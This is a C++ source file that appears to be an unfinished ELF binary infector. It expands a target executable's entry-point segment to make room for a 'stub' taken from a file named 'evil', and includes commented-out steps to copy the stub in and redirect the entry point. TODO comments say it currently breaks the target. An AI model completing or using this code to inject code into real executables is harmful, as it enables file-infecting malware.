#include <fstream>
#include <iostream>
#include <cstring>
// assume little endian
#include "elfstuff/elfcpp.h"

using namespace std;
using namespace elfcpp;

int main(void) {
  fstream stub("stub", fstream::in | fstream::binary);
  fstream from("evil", fstream::in | fstream::binary);
  fstream to("hello", fstream::in | fstream::out | fstream::binary);

  // get the file sizes
  stub.seekg(0, ifstream::end);
  int stub_size = stub.tellg();
  stub.seekg(0);
  from.seekg(0, ifstream::end);
  int from_size = from.tellg();
  from.seekg(0);
  to.seekg(0, ifstream::end);
  int to_size = to.tellg();
  to.seekg(0);

  // allocate memory for the two files
  unsigned char stub_buff[stub_size];
  unsigned char from_buff[from_size];
  unsigned char to_buff[to_size + stub_size];

  // read the headers
  stub.read((char*)stub_buff, stub_size);
  from.read((char*)from_buff, from_size);
  to.read((char*)to_buff, to_size);

  // assume little endian, 64 bit
  Ehdr<64, false> from_elf(from_buff);
  Ehdr<64, false> to_elf(to_buff);
  Ehdr_write<64, false> to_elfw(to_buff);

  // print the starting addresses
  cout << from_elf.get_e_entry() << endl;
  cout << to_elf.get_e_entry() << endl;

  // look for the program entry containing the entry point
  int main_phdr;
  for (int i = 0; i < to_elf.get_e_phnum(); i++) {
    Phdr<64, false> to_elf_phdr(to_buff + to_elf.get_e_phoff() + to_elf.get_e_phentsize() * i);
    if (to_elf_phdr.get_p_vaddr() < to_elf.get_e_entry() && to_elf.get_e_entry() < to_elf_phdr.get_p_vaddr() + to_elf_phdr.get_p_memsz()) {
      cout << "found main phdr" << endl;
      main_phdr = i;
      break;
    }
  }

  // add new code and a new program entry
  // put stub at end of file
  // make a new phentry
  // move everything forward by the size of one ph entry
  // to_elfw.put_e_phnum(to_elf.get_e_phnum() + 1);
  // OR

  // XXX: assume section headers are at end of file
  // move the section headers forward
  int sh_size = to_size - to_elf.get_e_shoff();
  int old_shoff = to_elf.get_e_shoff();
  // XXX: fuck sections!
  to_elfw.put_e_shnum(0);
  //unsigned char buf[sh_size];
  //memcpy(buf, to_buff + to_elf.get_e_shoff(), sh_size);
  //memcpy(to_buff + to_elf.get_e_shoff() + stub_size, buf, sh_size);
  //to_elfw.put_e_shoff(to_elf.get_e_shoff() + stub_size);

  // extend the size of the main phdr
  Phdr<64, false> to_elf_phdr(to_buff + to_elf.get_e_phoff() + to_elf.get_e_phentsize() * main_phdr);
  Phdr_write<64, false> to_elf_phdrw(to_buff + to_elf.get_e_phoff() + to_elf.get_e_phentsize() * main_phdr);
  int main_phdr_end = to_elf_phdr.get_p_offset() + to_elf_phdr.get_p_filesz();
  to_elf_phdrw.put_p_memsz(to_elf_phdr.get_p_memsz() + stub_size);
  cout << to_elf_phdr.get_p_filesz() << endl;
  to_elf_phdrw.put_p_filesz(to_elf_phdr.get_p_filesz() + stub_size);

  // move phdrs that were after the phdr we extended
  //TODO: copy them forward starting with the last one! also, make sure there's no overlap... this really has to be done more carefully
  //TODO: This causes the program to die; the issue is that there are overlapping phdr sections
  for (int i = to_elf.get_e_phnum() - 1; i >= 0 ; i--) {
    Phdr<64, false> to_elf_phdr(to_buff + to_elf.get_e_phoff() + to_elf.get_e_phentsize() * i);
    Phdr_write<64, false> to_elf_phdrw(to_buff + to_elf.get_e_phoff() + to_elf.get_e_phentsize() * i);
    if (to_elf_phdr.get_p_offset() >= main_phdr_end) {
      cout << "found phdr after the main phdr... moving from " << to_elf_phdr.get_p_offset() << " with size " << to_elf_phdr.get_p_filesz() << " (ends at " << to_elf_phdr.get_p_offset() + to_elf_phdr.get_p_filesz()<< ")" << endl;
      unsigned char buf[to_elf_phdr.get_p_filesz()];
      memcpy(buf, to_buff + to_elf_phdr.get_p_offset(), to_elf_phdr.get_p_filesz());
      memcpy(to_buff + to_elf_phdr.get_p_offset() + stub_size, buf, to_elf_phdr.get_p_filesz());
      to_elf_phdrw.put_p_offset(to_elf_phdr.get_p_offset() + stub_size);
    }
  }
  // copy the stub into the newly created space
  cerr << to_elf_phdr.get_p_offset() << endl;
  cerr << to_elf_phdr.get_p_filesz() << endl;
  //memcpy(to_buff + to_elf_phdr.get_p_offset() + to_elf_phdr.get_p_filesz() - stub_size , stub_buff, stub_size);
  // change the starting address to point to the new entry
  // TODO: dynamically set the return address from the stub to go into the old entry point
  //to_elfw.put_e_entry(to_elf_phdr.get_p_vaddr() + to_elf_phdr.get_p_memsz() - stub_size);

  from.close();
  to.close();

  // write the results out
  fstream tow("hello", fstream::trunc | fstream::out | fstream::binary);
  tow.seekp(0);
  tow.write((const char*)to_buff, to_size + stub_size);
  tow.close();

  return 0;
}
